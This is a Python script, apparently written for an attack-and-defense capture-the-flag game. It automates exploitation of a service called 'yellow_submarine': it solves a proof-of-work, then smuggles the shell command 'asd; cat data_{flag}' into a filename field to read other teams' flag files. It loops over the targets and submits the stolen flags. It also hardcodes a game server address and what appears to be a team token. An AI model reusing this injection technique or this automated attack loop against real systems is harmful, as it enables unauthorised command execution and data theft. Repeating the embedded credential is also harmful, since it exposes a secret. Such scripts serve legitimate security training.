
# I stumbled across this and stole it as a starting point. because lazy.
#  https://gist.github.com/ConnorNelson/07229c0a55aaf05571c26c854c300e33

import base64
import hashlib
import multiprocessing
import random
import socket
import string
import subprocess
import sys
import time
import uuid
from swpag_client import Team # pip install swpag_client
from pwn import * # pip install pwntools

def printable(s):
    return filter(lambda x: x in string.printable, s)

def yellow_sub(conn, flag_id):
    class proofer():
        def __init__(self, challenge, prefix):
            self.challenge = challenge
            self.prefix = prefix
            self.queue = multiprocessing.Queue()
            self.event = multiprocessing.Event()
            self.workers = []

        @staticmethod
        def randstring(prefix, s):
            return str(prefix) + ''.join([random.choice(string.ascii_letters + string.digits) for c in range(s)])

        @staticmethod
        def proofofwork(queue, event, challenge, prefix):
            MAX_ATTEMPTS = 100000
            attempts = MAX_ATTEMPTS

            s = ''
            h = ''

            while attempts >= 0 and not event.is_set():
                attempts -= 1
                s = proofer.randstring(prefix, 100)
                h = hashlib.sha256(s).hexdigest()
                if h.startswith(challenge):
                    break

            if h.startswith(challenge):
                soln = (MAX_ATTEMPTS - attempts, challenge, prefix, h, s[len(prefix):],)
                queue.put(soln)
                event.set()
                return True

            return False

        def solve(self):
            self.stop = [False]
            self.event.clear()

            starttime = time.time()

            for w in range(max(1, multiprocessing.cpu_count() - 2)):
                p = multiprocessing.Process(target=self.worker, args=(self.queue, self.event, self.challenge, self.prefix,))
                p.start()
                self.workers.append(p)

            soln = self.queue.get()
            endtime = time.time()
            duration = endtime - starttime

            print("found in %.4fs: %s" % (duration, soln))

            for w in self.workers:
                w.join(timeout=0.05)

            return soln

        @staticmethod
        def worker(queue, event, challenge, prefix):
            while not proofer.proofofwork(queue, event, challenge, prefix) and not event.is_set():
                pass

    c = conn

    banner = c.recv(timeout=5)
    c.recvuntil('$', timeout=5)
    c.sendline('keygen')
    pewpew = c.recvline()
    print(pewpew)

    challenge, prefix = pewpew.split(b': ',2)[1].strip().strip(b'.').split(b'|')

    poof = proofer(challenge, prefix)
    soln = poof.solve()
    tries, challenge2, prefix2, digest, solution = soln
    assert (challenge2 == challenge)
    assert (prefix2 == prefix)
    assert (hashlib.sha256(prefix + solution).hexdigest().startswith(challenge))
    c.sendline(solution)
    _ = c.recvuntil('$')

    #filename = str(uuid.uuid4())
    #filename = "iloveyou"
    #c.sendline('store')
    #_ = c.recvuntil('send me a filename')
    #_ = c.recvuntil('>')
    #c.sendline(filename)
    #_ = c.recvuntil('tell me your secret')
    #_ = c.recvuntil('>')
    #c.sendline(base64.b64encode('iloveyou'))
    #_ = c.recvuntil(':')
    #_ = c.recvuntil('\n')
    #iloveyou_token = c.recvline().strip()
    #_ = c.recvuntil('$')

    ### the next store that does the ... ; cp
    c.sendline('store')
    _ = c.recvuntil('send me a filename')
    _ = c.recvuntil('>')
    c.sendline('asd; cat data_{flag}'.format(flag=flag_id))
    _ = c.recvuntil('tell me your secret')
    _ = c.recvuntil('>')
    c.sendline(base64.b64encode('iloveyou'))
    _ = c.recvuntil(':')
    _ = c.recvuntil('\n')
    exploit_token = c.recvline().strip()
    _ = c.recvuntil('$')

    c.sendline('read')
    _ = c.recvuntil('>')
    print("about to read exploit file")
    c.sendline(exploit_token)
    #exploit_result = c.recvuntil('$')
    _ = c.recvline_contains('Hey.')
    #import code; code.interact(local=dict(globals(), **locals()))
    flag = c.recvline_regex(r'\S{3,}').strip()
    c.close()

    #c.sendline('read')
    #_ = c.recvuntil('>')
    #c.sendline(iloveyou_token)
    #_ = c.recvline_contains('Hey.')
    ##import code; code.interact(local=dict(globals(), **locals()))
    #flag = c.recvline_regex(r'\S{3,}').strip()
    #c.close()
    return printable(base64.b64decode(printable(flag)))

valid_hosts = set()
def find_valid_hosts():
    print("Scanning hosts from /etc/hosts... this will take a couple of minutes.")
    proc = subprocess.Popen(['/root/nmap/find_hosts.sh'],stdout=subprocess.PIPE)
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        ip = line.rstrip().decode("utf-8")
        valid_hosts.add(ip)
    return

# attack functions for each service...

# everybodys_got_something_to_hide
def attack_svc1(flag_id):
    print("running attack on service 1, flag id:", flag_id)
    flag = ""
    return flag

# yellow_submarine
def attack_svc2(conn, flag_id):
    print("running attack on service 2, flag id:", flag_id)
    flag = yellow_sub(conn, flag_id)
    return flag

# lucy_in_the_sky_with_diamonds
def attack_svc3(flag_id):
    print("running attack on service 3, flag id:", flag_id)
    flag = ""
    return flag

# strawberry_fields_forever
def attack_svc4(flag_id):
    print("running attack on service 4, flag id:", flag_id)
    flag = ""
    return flag

# come-together
def attack_svc5(flag_id):
    print("running attack on service 5, flag id:", flag_id)
    flag = ""
    return flag

# she_came_in_through_the_bathroom_window
def attack_svc6(flag_id):
    print("running attack on service 6, flag id:", flag_id)
    flag = ""
    return flag

# 1after909
def attack_svc7(flag_id):
    print("running attack on service 7, flag id:", flag_id)
    flag = ""
    return flag

# NOTE: update this whitelist for the attack functions above.
# So we don't waste time executing stuff that's not done.
implemented_attack_functions = {2}

attack_functions = [None, attack_svc1, attack_svc2, attack_svc3, attack_svc4, attack_svc5, attack_svc6, attack_svc7]
team = Team("http://52.53.64.114", "C3U6ooCuCLGoTgzOqoO3")
services = team.get_service_list()
service_flag_ids = dict()

while True:
    for service in services:
        if service['service_id'] not in implemented_attack_functions:
            print("skipping service", service['service_id'], ", attack function not implemented")
            continue
        print("Going to attack", service['service_name'])
        if service['service_name'] not in service_flag_ids:
            service_flag_ids[service['service_name']] = set()
        targets = team.get_targets(service['service_id'])
        for target in targets:
            if not target["team_name"].startswith("fos_"):
                continue
            flag_id = target['flag_id']
            ip = socket.gethostbyname(target['hostname'])
            if ip == "10.9.4.4":
                continue
            port = target['port']
            print("ip:", ip, ", port:", port, ", flag_id:", flag_id)
            if flag_id in service_flag_ids[service['service_name']]:
                print("Skipping... already processed this flag_id.")
                continue
            try:
                conn = remote(ip, port, timeout=30)
                context.log_level = "debug"
                flag = attack_functions[service['service_id']](conn, flag_id)
                print("flag:", flag)
                conn.close()
                result = team.submit_flag(flag)
                print(result)
            except Exception as e:
                print("Error connecting to", target['team_name'], target['hostname'], ip, port)
                print(e)
            service_flag_ids[service['service_name']].add(flag_id)

    time.sleep(10) # DOS is against the rules

